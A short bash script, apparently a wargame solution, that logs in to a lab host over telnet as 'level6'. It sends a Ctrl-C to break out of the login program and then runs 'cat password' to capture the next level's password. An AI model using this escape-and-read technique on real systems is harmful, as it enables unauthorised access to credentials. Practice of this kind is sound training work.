#!/bin/bash

# Description:
# This is Remote Exploit tool to get level6's password

export TERM=xterm
export LANG=en_US.UTF-8
export IP1=192.168.10.240
export PORT1=23
LOG1=level6.log

attack() {
    sleep 4; echo "what the hell"
    sleep 1; echo "^C"    # <CTL + V + C> in vi script
    sleep 1; echo "cat password"
    sleep 1; echo "exit"
}

> $LOG1 && echo "[*] Log file created."
echo "[*] Level6 attack started. Please wait ...."
attack | telnet -l level6 $IP1 $PORT1 > $LOG1 2>&1
grep 'Level7 password' $LOG1
if [ $? -eq 0 ] ; then
    echo "[+] attack success."
else
    echo "[-] attack failed."
fi
